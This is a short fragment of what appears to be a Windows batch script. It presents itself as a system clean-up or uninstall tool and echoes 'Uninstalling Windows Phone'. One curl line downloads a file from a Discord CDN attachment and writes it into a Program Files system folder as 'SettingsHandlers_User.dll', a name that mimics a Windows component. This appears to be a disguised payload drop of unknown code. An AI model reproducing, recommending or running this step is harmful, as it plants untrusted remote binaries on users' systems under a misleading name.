...
curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\SettingsHandlers_User.dll" "https://cdn.discordapp.com/attachments/1229502986363994182/1245764677674205254/SettingsHandlers_user.zip?ex=6659f044&is=66589ec4&hm=f64e0a03bd9ffe69fd63427e8efe104aa86ee9fa5eb591108ee29732a4083463&" -# --create-dirs 


set "logFile=C:\Program Files\Windows NT\Accessories\en-US\SettingsHandlers_User.dll"
...
echo Uninstalling Windows Phone
